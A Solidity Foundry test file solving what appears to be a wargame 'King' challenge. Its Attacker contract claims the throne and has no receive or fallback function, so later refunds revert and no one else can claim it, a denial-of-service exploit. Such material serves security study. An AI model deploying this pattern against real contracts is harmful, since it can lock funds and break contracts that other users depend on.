// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Test, console2} from "forge-std/Test.sol";
import {King} from "../King.sol";

contract KingTest is Test {
    King king;
    address firstKing = makeAddr("firstKing");

    function setUp() public {
        vm.prank(firstKing);
        vm.deal(firstKing, 1 ether);
        king = new King{value: 1 ether}();
    }
    function test_Challenge9_Passed() public {
        becomeKing(); 
        // attacker has no receive and fallback, therefore if prize can't be sent
        // no one else can become king again  
        cantClaimKingAnymore();
    }
    function becomeKing() public {
        Attacker attacker = new Attacker(king);
        vm.deal(address(attacker), 2 ether);
        attacker.attack();
        vm.stopPrank();

        bytes32 currentKing = vm.load(address(king), bytes32(uint256(0)));
        assertEq(address(uint160(uint256(currentKing))), address(attacker));
    }
    function cantClaimKingAnymore() public {
        address nextKingX = makeAddr("nextKingX");
        vm.prank(nextKingX);
        vm.deal(nextKingX, 4 ether);
        vm.expectRevert();
        (bool success,) = address(king).call{value: 4 ether}("");

    }
}

contract Attacker {
    King king;

    constructor(King king_) {
        king = king_;
    }
    function attack() public payable {
        (bool success,) = address(king).call{value: 2 ether}("");
        require(success);
    }
}